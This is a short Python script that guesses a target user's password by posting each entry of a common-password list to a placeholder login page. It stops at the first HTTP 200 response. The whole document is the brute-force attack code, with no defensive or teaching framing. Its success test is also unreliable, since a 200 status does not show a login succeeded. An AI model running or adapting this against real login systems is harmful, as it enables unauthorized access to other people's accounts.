import requests

# The URL of the login page
url = 'http://example.com/login'

# The dictionary of passwords
passwords = ['password1', 'password2', 'password3', '123456', 'qwerty']

# The username whose password we want to guess
username = 'target_username'

# Iterate over the dictionary of passwords
for password in passwords:
    # Make a POST request to the login page with the current password
    response = requests.post(url, data={'username': username, 'password': password})

    # Check if the login was successful (i.e., the response code is 200)
    if response.status_code == 200:
        # The password is correct!
        print('Password found:', password)
        break
